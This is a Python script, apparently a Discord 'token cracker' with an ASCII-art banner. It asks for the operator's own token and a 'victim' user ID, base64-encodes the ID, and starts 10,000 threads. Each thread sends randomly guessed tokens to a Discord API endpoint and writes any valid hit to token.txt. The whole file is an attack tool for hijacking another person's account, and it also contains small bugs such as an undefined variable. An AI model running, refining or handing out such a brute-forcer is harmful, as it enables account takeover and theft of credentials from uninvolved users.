import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'): 
        command = 'cls'
    os.system(command)
clearConsole
clearConsole()
print ('''
		██████╗░██████╗░██╗░░░██╗████████╗███████╗
		██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
		██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
		██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
		██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
		╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝
		
		░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
		██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
		██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░
		██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░
		╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗
		░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
		
Made by: Mohi63
github: https://github.com/Mohi63
''')
                                                                                  
TOKEN = input(f"[{Fore.RED}>{Fore.RESET}]{Fore.YELLOW} Your token : ")

def notifyMe(title, message):
	notification.notify(
		title = title,
		message = message,
		)

class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"{Fore.WHITE}[{Fore.RED}>{Fore.RESET}]{Fore.YELLOW} ID of victim : ")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    print(f"{Fore.RED}Attempting to crack {Fore.YELLOW}{user}{Fore.RED}'s token")
    time.sleep(3)
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

def gen(encodedid, encodedstamp):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{Fore.GREEN}{token} {Fore.YELLOW} | {Fore.GREEN}Valid')
        notifyMe("Token trouver", f"The Token Of {user} Has Been Found, Check The Token Folder!")
        f = open("token.txt", "a")
        f.write(token)
        f.close() 
        exit(0)
    else:
        print(f'{Fore.BLUE}{token} {Fore.YELLOW} | {Fore.RED}Invalid')


token = os.environ.get(TOKEN)
client = MyClient()
client.run(TOKEN, bot=False,)

